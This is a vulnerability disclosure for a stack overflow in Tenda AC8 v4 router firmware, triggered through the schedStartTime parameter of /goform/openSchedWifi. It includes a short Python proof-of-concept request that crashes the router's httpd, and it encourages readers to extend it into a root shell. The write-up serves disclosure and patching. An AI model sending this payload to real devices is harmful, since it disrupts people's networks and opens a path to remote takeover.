# Affected Version
Tenda AC8 v4 US_AC8V4.0si_V16.03.34.06_cn
# Fixed Version
Tenda AC8 v4 US_AC8V4.0si_V16.03.34.09_cn
# Vulnerability Description
Tenda AC8 v4 US_AC8V4.0si_V16.03.34.06_cn was discovered to contain a stack overflow via parameter schedStartTime and schedEndTime at url /goform/openSchedWifi.

# Firmware download address
https://www.tenda.com.cn/download/detail-3518.html

# Vulnerability Details
In function setSchedWifi() line 39, Var is a a user-controlled parameter(‘schedStartTime’) and is read in without length check.Then in line 56, the content of Var is copied into local variable ptr+2, which leads to a stack overflow vulnerbility.
![](https://github.com/peris-navince/founded-0-days/blob/main/ac8/setSchedEWifi/1.png)



As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution with carefully crafted overflow data.

# Recurring vulnerabilities and POC
By sending delicately constructed data package as the poc above, we can cause a stack overflow error, leading to the crash of httpd process.
<pre>
import requests
    
host = "192.168.88.132"
 
cyclic = b"\r"    
    
cyclic3 = b"111,222,333,"    

def exploit_setSchedWifi():
    url = f"http://{host}/goform/openSchedWifi"
    data = {
        b'schedStartTime':cyclic3,
        b'timeType':b'123',
        b'day':cyclic
    }
    res = requests.post(url=url,data=data)
    print(res.content)

exploit_setSchedWifi()
</pre>

![](https://github.com/peris-navince/founded-0-days/blob/main/ac8/setSchedEWifi/0.png)

And you can write your own exp to get the root shell.
